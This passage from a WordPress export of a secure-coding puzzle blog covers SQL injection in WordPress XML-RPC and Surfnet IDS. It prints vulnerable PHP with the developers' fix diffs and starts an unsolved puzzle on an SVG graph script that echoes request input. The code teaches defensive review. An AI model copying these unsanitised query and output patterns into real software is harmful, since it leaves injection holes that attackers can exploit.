On line 66 we see that $max_results is assigned the value from $args[4].  $max_results is then used to build a portion of a SQL string which is assigned to the $limit variable.  $limit is then passed to the end of a SQL statement on line 84, resulting in SQL injection.  Some readers may point out that $args is escaped in on line 60, before it is used to build any SQL statement.  Unfortunately, escaping values in this case doesn’t prevent SQL injection.  The attacker controlled value is eventually used to build a LIMIT clause.  The LIMIT clause doesn’t enclose the attacker supplied values within quotes, so there are no quotes to break out of.

The developers addressed this issue by casting args[4] to int during assignment to $max_results.  If args[4] contains any characters that do not qualify as an integer, the value will not be passed to the LIMIT statement.


<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="60,66,67,84"]
&lt;?php
...snip...
	function wp_newCategory($args) {
		$this-&gt;escape($args);

		$blog_id				= (int) $args[0];
		$username				= $args[1];
		$password				= $args[2];
		$category				= $args[3];

		if(!$this-&gt;login_pass_ok($username, $password)) {
			return($this-&gt;error);
		}

		// Set the user context and make sure they are
		// allowed to add a category.
		set_current_user(0, $username);
		if(!current_user_can(&quot;manage_categories&quot;, $page_id)) {
			return(new IXR_Error(401, __(&quot;Sorry, you do not have the right to add a category.&quot;)));
		}

		// We need this to make use of the wp_insert_category()
		// funciton.
		require_once(ABSPATH . &quot;wp-admin/admin-db.php&quot;);

		// If no slug was provided make it empty so that
		// WordPress will generate one.
		if(empty($category[&quot;slug&quot;])) {
			$category[&quot;slug&quot;] = &quot;&quot;;
		}

		// If no parent_id was provided make it empty
		// so that it will be a top level page (no parent).
		if ( !isset($category[&quot;parent_id&quot;]) )
			$category[&quot;parent_id&quot;] = &quot;&quot;;

		// If no description was provided make it empty.
		if(empty($category[&quot;description&quot;])) {
			$category[&quot;description&quot;] = &quot;&quot;;
		}
	
		$new_category = array(
			&quot;cat_name&quot;				=&gt; $category[&quot;name&quot;],
			&quot;category_nicename&quot;		=&gt; $category[&quot;slug&quot;],
			&quot;category_parent&quot;		=&gt; $category[&quot;parent_id&quot;],
			&quot;category_description&quot;	=&gt; $category[&quot;description&quot;]
		);

		$cat_id = wp_insert_category($new_category);
		if(!$cat_id) {
			return(new IXR_Error(500, __(&quot;Sorry, the new category failed.&quot;)));
		}

		return($cat_id);
	}


	function wp_suggestCategories($args) {
		global $wpdb;

		$this-&gt;escape($args);

		$blog_id				= (int) $args[0];
		$username				= $args[1];
		$password				= $args[2];
		$category				= $args[3];
-		$max_results			= $args[4];
+		$max_results            = (int) $args[4];

		if(!$this-&gt;login_pass_ok($username, $password)) {
			return($this-&gt;error);
		}

		// Only set a limit if one was provided.
		$limit = &quot;&quot;;
		if(!empty($max_results)) {
			$limit = &quot;LIMIT {$max_results}&quot;;
		}

		$category_suggestions = $wpdb-&gt;get_results(&quot;
			SELECT cat_ID category_id,
				cat_name category_name
			FROM {$wpdb-&gt;categories}
			WHERE cat_name LIKE '{$category}%'
			{$limit}
		&quot;);

		return($category_suggestions);
	}


	/* Blogger API functions
	 * specs on http://plant.blogger.com/api and http://groups.yahoo.com/group/bloggerDev/
	 */


	/* blogger.getUsersBlogs will make more sense once we support multiple blogs */
	function blogger_getUsersBlogs($args) {

		$this-&gt;escape($args);

		$user_login = $args[1];
		$user_pass  = $args[2];

		if (!$this-&gt;login_pass_ok($user_login, $user_pass)) {
			return $this-&gt;error;
		}

		set_current_user(0, $user_login);
		$is_admin = current_user_can('level_8');

		$struct = array(
			'isAdmin'  =&gt; $is_admin,
			'url'      =&gt; get_option('home') . '/',
			'blogid'   =&gt; '1',
			'blogName' =&gt; get_option('blogname')
		);

		return array($struct);
	}

...snip...
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1303</wp:post_id>
		<wp:post_date>2011-01-28 04:10:12</wp:post_date>
		<wp:post_date_gmt>2011-01-28 11:10:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>wood-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/gP94FH]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[b26d5d93f1b8f63a9ab1a0a76de58a4e]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Money</title>
		<link>http://spotthevuln.com/2011/01/money/</link>
		<pubDate>Mon, 31 Jan 2011 09:50:37 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1306</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Money won't buy happiness, but it will pay the salaries of a large research staff to study the problem.</strong> <br><strong> - Bill Vaughan
</strong>
[sourcecode language="php"]
&lt;?php
...snip...

include '../include/config.inc.php';
include '../include/connect.inc.php';
include '../include/functions.inc.php';

session_start();
header(&quot;Cache-control: private&quot;);

if (!isset($_SESSION['s_admin'])) {
  pg_close($pgconn);
  $address = getaddress($web_port);
  header(&quot;location: ${address}login.php&quot;);
  exit;
}

$s_org = intval($_SESSION['s_org']);
$s_admin = intval($_SESSION['s_admin']);
$s_access = $_SESSION['s_access'];
$s_access_sensor = intval($s_access{0});

if ($s_access_sensor == 0) {
  $m = 90;
  pg_close($pgconn);
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&quot;);
  exit;
}

if (isset($_GET['selview'])) {
  $selview = intval($_GET['selview']);
}
      
$error = 0;
$keyname = $_POST['keyname'];
$vlanid = $_POST['vlanid'];
$action = $_POST['action'];
if (isset($_POST[tapip])) {
  $tapip = pg_escape_string(stripinput($_POST[tapip]));
  if (preg_match($ipregexp, $tapip)) {
    $sql_checkip = &quot;SELECT tapip FROM sensors WHERE tapip = '$tapip' AND NOT keyname = '$keyname'&quot;;
    $result_checkip = pg_query($pgconn, $sql_checkip);
    $checkip = pg_num_rows($result_checkip);
    if ($checkip &gt; 0) {
      $m = 101;
      $error = 1;
    } else {
      $sql_updatestatus = &quot;UPDATE sensors SET tapip = '$tapip' WHERE keyname = '$keyname' AND vlanid ='$vlanid'&quot;;
      $result_updatestatus = pg_query($pgconn, $sql_updatestatus);
      $m = 7;
    }
  } else {
    $m = 102;
    $error = 1;
  }
} 
if ($error == 0) {
  $sql_updatestatus = &quot;UPDATE sensors SET action = '&quot; .$action. &quot;' WHERE keyname = '$keyname'&quot;;
  $result_updatestatus = pg_query($pgconn, $sql_updatestatus);
  $m = 7;
}

pg_close($pgconn);
if ($m != 1) {
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&amp;key=$keyname&quot;);
} else {
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&quot;);
}
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1306</wp:post_id>
		<wp:post_date>2011-01-31 02:50:37</wp:post_date>
		<wp:post_date_gmt>2011-01-31 09:50:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>money</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/eFd8X1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[a69c9b9294d8a00a28d2c2eed0409540]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[a69c9b9294d8a00a28d2c2eed0409540]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1572</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention Code Snippet Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/01/money/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-01-31 03:36:14</wp:comment_date>
			<wp:comment_date_gmt>2011-01-31 10:36:14</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by @montanaflynn, Spot The Vuln. Spot The Vuln said: New Post: Money http://bit.ly/eFd8X1 #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1296470174.5908";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1296806217.6281";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Money - SQL Injection</title>
		<link>http://spotthevuln.com/2011/02/money-sql-injection/</link>
		<pubDate>Fri, 04 Feb 2011 12:57:22 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1309</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>Details</h3>
Affected Software: Surfnet IDS

Fixed in Version: 1.03.07

Issue Type: SQL Injection

Original Code: <a title="Money" href="http://spotthevuln.com/2011/01/money/" target="_blank">Found    Here</a>
<h3>Description</h3>
There were a couple of SQL injection bugs here.  Beginning at line 35, we see that the Surfnet IDS developers have accepted three POST parameters and have assigned tainted values to three different variables: $keyname, $vlanid, $action.  $keyname is eventually passed to three different dynamic SQL queries, all of which result in SQL injection. Those queries can be seen on lines 52, 59, and 69.  $vlanid is passed to a dynamic SQL query, resulting in SQL injection.  This dynamic query can be seen on line 59.  Finally, $action is passed to a dynamic SQL statement, resulting in yet another SQL injection bug.  This dynamic query can be found on line 69.  All of the bugs were straightforward SQL injection bugs and should have been caught early in the dev cycle.

The developers addressed the issue by and/or validating all of the POST parameters before using those values in SQL statements.

<h3>Developers Solution</h3>
[sourcecode language="diff" highlight="35-48,52,59,69,"]
&lt;?php
...snip...

include '../include/config.inc.php';
include '../include/connect.inc.php';
include '../include/functions.inc.php';

session_start();
header(&quot;Cache-control: private&quot;);

if (!isset($_SESSION['s_admin'])) {
  pg_close($pgconn);
  $address = getaddress($web_port);
  header(&quot;location: ${address}login.php&quot;);
  exit;
}

$s_org = intval($_SESSION['s_org']);
$s_admin = intval($_SESSION['s_admin']);
$s_access = $_SESSION['s_access'];
$s_access_sensor = intval($s_access{0});

if ($s_access_sensor == 0) {
  $m = 90;
  pg_close($pgconn);
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&quot;);
  exit;
}

if (isset($_GET['selview'])) {
  $selview = intval($_GET['selview']);
}
      
$error = 0;
-$keyname = $_POST['keyname'];
-$vlanid = $_POST['vlanid'];
-$action = $_POST['action'];
-if (isset($_POST[tapip])) {
+$keyname = pg_escape_string($_POST['keyname']); 
+	$vlanid = intval($_POST['vlanid']); 
+	$action = pg_escape_string($_POST['action']); 
+	$action_pattern = '/^(NONE|REBOOT|SSHOFF|SSHON|CLIENT|RESTART|BLOCK)$/'; 
+	if (preg_match($action_pattern, $action) != 1) { 
+	  $m = 44; 
+	  $error = 1; 
+	} 
+	 
+if (isset($_POST[tapip]) &amp;&amp; $error != 1) {
	
  $tapip = pg_escape_string(stripinput($_POST[tapip]));
  if (preg_match($ipregexp, $tapip)) {
    $sql_checkip = &quot;SELECT tapip FROM sensors WHERE tapip = '$tapip' AND NOT keyname = '$keyname'&quot;;
    $result_checkip = pg_query($pgconn, $sql_checkip);
    $checkip = pg_num_rows($result_checkip);
    if ($checkip &gt; 0) {
      $m = 101;
      $error = 1;
    } else {
      $sql_updatestatus = &quot;UPDATE sensors SET tapip = '$tapip' WHERE keyname = '$keyname' AND vlanid ='$vlanid'&quot;;
      $result_updatestatus = pg_query($pgconn, $sql_updatestatus);
      $m = 7;
    }
  } else {
    $m = 102;
    $error = 1;
  }
} 
if ($error == 0) {
  $sql_updatestatus = &quot;UPDATE sensors SET action = '&quot; .$action. &quot;' WHERE keyname = '$keyname'&quot;;
  $result_updatestatus = pg_query($pgconn, $sql_updatestatus);
  $m = 7;
}

pg_close($pgconn);
if ($m != 1) {
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&amp;key=$keyname&quot;);
} else {
  header(&quot;location: sensorstatus.php?selview=$selview&amp;m=$m&quot;);
}
?&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1309</wp:post_id>
		<wp:post_date>2011-02-04 05:57:22</wp:post_date>
		<wp:post_date_gmt>2011-02-04 12:57:22</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>money-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="dynamic-query"><![CDATA[dynamic query]]></category>
		<category domain="post_tag" nicename="dynamic-sql"><![CDATA[dynamic SQL]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="post_tag" nicename="sql-queries"><![CDATA[sql queries]]></category>
		<category domain="post_tag" nicename="sql-statements"><![CDATA[sql statements]]></category>
		<category domain="post_tag" nicename="sqli"><![CDATA[SQLi]]></category>
		<category domain="category" nicename="surfids"><![CDATA[SurfIDS]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fM3DqD]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[26399af135b575e6d7498f0479ea5ab5]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1588</wp:comment_id>
			<wp:comment_author><![CDATA[Tweets that mention PHP, SQL Injection, Solution, SurfIDS Vulnerability Code Example «SpotTheVuln.com -- Topsy.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://topsy.com/spotthevuln.com/2011/02/money-sql-injection/?utm_source=pingback&amp;utm_campaign=L2</wp:comment_author_url>
			<wp:comment_author_IP>208.74.66.43</wp:comment_author_IP>
			<wp:comment_date>2011-02-04 07:10:29</wp:comment_date>
			<wp:comment_date_gmt>2011-02-04 14:10:29</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] This post was mentioned on Twitter by @montanaflynn, Spot The Vuln. Spot The Vuln said: New Post: Money - SQL Injection http://bit.ly/eyrcCm #secure #code #dev [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1297062448.4633";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1296828629.117";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Light</title>
		<link>http://spotthevuln.com/2011/02/light/</link>
		<pubDate>Mon, 07 Feb 2011 12:07:48 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1313</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>To send light into the darkness of men's hearts - such is the duty of the artist.</strong> <br><strong>  - Schumann
</strong></blockquote>
[sourcecode language="php"]
&lt;?php
... snip ...
require(&quot;guiconfig.inc&quot;);

header(&quot;Content-type: image/svg+xml&quot;);

/********** HTTP GET Based Conf ***********/
$ifnum=@$_GET[&quot;ifnum&quot;];  // BSD / SNMP interface name / number
$ifname=@$_GET[&quot;ifname&quot;]?$_GET[&quot;ifname&quot;]:&quot;Interface $ifnum&quot;;  //Interface name that will be showed on top right of graph

/********* Other conf *******/
$scale_type=&quot;follow&quot;; //Autoscale default setup : &quot;up&quot; = only increase scale; &quot;follow&quot; = increase and decrease scale according to current graphed datas
$nb_plot=120;         //NB plot in graph
$time_interval=1;		  //Refresh time Interval
$unit=&quot;bits&quot;;         //Initial unit type: &quot;bits&quot; or &quot;bytes&quot;
$fetch_link = &quot;stats.php?if=$ifnum&quot;;

//SVG attributes
$attribs['bg']='fill=&quot;#EEEEEE&quot; stroke=&quot;none&quot; stroke-width=&quot;0&quot; opacity=&quot;1&quot;';
$attribs['axis']='fill=&quot;black&quot; stroke=&quot;black&quot;';
$attribs['in']='fill=&quot;#00CC00&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;7&quot;';
$attribs['out']='fill=&quot;#FF0000&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;7&quot;';
$attribs['graph_in']='fill=&quot;none&quot; stroke=&quot;#00CC00&quot; stroke-opacity=&quot;0.8&quot;';
$attribs['graph_out']='fill=&quot;none&quot; stroke=&quot;#FF0000&quot; stroke-opacity=&quot;0.8&quot;';
$attribs['legend']='fill=&quot;black&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot;';
$attribs['graphname']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;8&quot;';
$attribs['grid_txt']='fill=&quot;gray&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;6&quot;';
$attribs['grid']='stroke=&quot;gray&quot; stroke-opacity=&quot;0.5&quot;';
$attribs['switch_unit']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot; text-decoration=&quot;underline&quot;';
$attribs['switch_scale']='fill=&quot;#435370&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot; text-decoration=&quot;underline&quot;';
$attribs['error']='fill=&quot;red&quot; font-family=&quot;Arial&quot; font-size=&quot;4&quot;';
$attribs['collect_initial']='fill=&quot;gray&quot; font-family=&quot;Tahoma, Verdana, Arial, Helvetica, sans-serif&quot; font-size=&quot;4&quot;';

//Error text if we cannot fetch data : depends on which method is used
$error_text = gettext(&quot;Cannot get data about interface&quot;) . &quot; $ifnum&quot;;

$height=100;            //SVG internal height : do not modify
$width=200;             //SVG internal width : do not modify

$encoding = system_get_language_codeset();

/********* Graph DATA **************/
header(&quot;Last-Modified: &quot; . gmdate( &quot;D, j M Y H:i:s&quot; ) . &quot; GMT&quot;);
header(&quot;Expires: &quot; . gmdate( &quot;D, j M Y H:i:s&quot;, time() ) . &quot; GMT&quot;);
header(&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;); // HTTP/1.1
header(&quot;Cache-Control: post-check=0, pre-check=0&quot;, FALSE);
header(&quot;Pragma: no-cache&quot;); // HTTP/1.0
header(&quot;Content-type: image/svg+xml&quot;);
echo &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;{$encoding}\&quot;?&gt;\n&quot;;
?&gt;
&lt;svg width=&quot;100%&quot; height=&quot;100%&quot; viewBox=&quot;0 0 &lt;?=$width?&gt; &lt;?=$height?&gt;&quot; preserveAspectRatio=&quot;none&quot; xml:space=&quot;preserve&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; onload=&quot;init(evt)&quot;&gt;
  &lt;g id=&quot;graph&quot;&gt;
    &lt;rect id=&quot;bg&quot; x1=&quot;0&quot; y1=&quot;0&quot; width=&quot;100%&quot; height=&quot;100%&quot; &lt;?=$attribs['bg']?&gt;/&gt;
    &lt;line id=&quot;axis_x&quot; x1=&quot;0&quot; y1=&quot;0&quot; x2=&quot;0&quot; y2=&quot;100%&quot; &lt;?=$attribs['axis']?&gt;/&gt;
    &lt;line id=&quot;axis_y&quot; x1=&quot;0&quot; y1=&quot;100%&quot; x2=&quot;100%&quot; y2=&quot;100%&quot; &lt;?=$attribs['axis']?&gt;/&gt;
    &lt;path id=&quot;graph_out&quot; d=&quot;M0 &lt;?=$height?&gt; L 0 &lt;?=$height?&gt;&quot; &lt;?=$attribs['graph_out']?&gt;/&gt;
    &lt;path id=&quot;graph_in&quot;  d=&quot;M0 &lt;?=$height?&gt; L 0 &lt;?=$height?&gt;&quot; &lt;?=$attribs['graph_in']?&gt;/&gt;
    &lt;path id=&quot;grid&quot;  d=&quot;M0 &lt;?=$height/4*1?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*1?&gt; M0 &lt;?=$height/4*2?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*2?&gt; M0 &lt;?=$height/4*3?&gt; L &lt;?=$width?&gt; &lt;?=$height/4*3?&gt;&quot; &lt;?=$attribs['grid']?&gt;/&gt;
    &lt;text id=&quot;grid_txt1&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*1?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;75%&lt;/text&gt;
    &lt;text id=&quot;grid_txt2&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*2?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;50%&lt;/text&gt;
    &lt;text id=&quot;grid_txt3&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;&lt;?=$height/4*3?&gt;&quot; &lt;?=$attribs['grid_txt']?&gt; text-anchor=&quot;end&quot;&gt;25%&lt;/text&gt;
    &lt;text id=&quot;graph_in_lbl&quot; x=&quot;5&quot; y=&quot;8&quot; &lt;?=$attribs['in']?&gt;&gt;&lt;?=gettext(&quot;In&quot;);?&gt; &lt;tspan id=&quot;graph_in_txt&quot; &lt;?=$attribs['in']?&gt;&gt; &lt;/tspan&gt;&lt;/text&gt;
    &lt;text id=&quot;graph_out_lbl&quot; x=&quot;5&quot; y=&quot;16&quot; &lt;?=$attribs['out']?&gt;&gt;&lt;?=gettext(&quot;Out&quot;);?&gt; &lt;tspan id=&quot;graph_out_txt&quot; &lt;?=$attribs['out']?&gt;&gt; &lt;/tspan&gt;&lt;/text&gt;
    &lt;text id=&quot;ifname&quot; x=&quot;&lt;?=$width?&gt;&quot; y=&quot;8&quot; &lt;?=$attribs['graphname']?&gt; text-anchor=&quot;end&quot;&gt;&lt;?=$ifname?&gt;&lt;/text&gt;
    &lt;text id=&quot;switch_unit&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;5&quot; &lt;?=$attribs['switch_unit']?&gt;&gt;&lt;?=sprintf(gettext(&quot;Switch to %s/s&quot;), (&quot;bits&quot; === $unit) ? &quot;bytes&quot; : &quot;bits&quot;);?&gt;&lt;/text&gt;
    &lt;text id=&quot;switch_scale&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;11&quot; &lt;?=$attribs['switch_scale']?&gt;&gt;&lt;?=gettext(&quot;AutoScale&quot;);?&gt; (&lt;?=(&quot;up&quot; === $scale_type) ? gettext(&quot;Up&quot;) : gettext(&quot;Follow&quot;);?&gt;)&lt;/text&gt;
    &lt;text id=&quot;datetime&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;17&quot; &lt;?=$attribs['legend']?&gt;&gt; &lt;/text&gt;
    &lt;text id=&quot;graphlast&quot; x=&quot;&lt;?=$width*0.55?&gt;&quot; y=&quot;23&quot; &lt;?=$attribs['legend']?&gt;&gt;&lt;?=gettext(&quot;Graph shows last&quot;);?&gt; &lt;?=$time_interval*$nb_plot?&gt; &lt;?=gettext(&quot;seconds&quot;);?&gt;&lt;/text&gt;
    &lt;polygon id=&quot;axis_arrow_x&quot; &lt;?=$attribs['axis']?&gt; points=&quot;&lt;?=($width) . &quot;,&quot; . ($height)?&gt; &lt;?=($width-2) . &quot;,&quot; . ($height-2)?&gt; &lt;?=($width-2) . &quot;,&quot; . $height?&gt;&quot;/&gt;
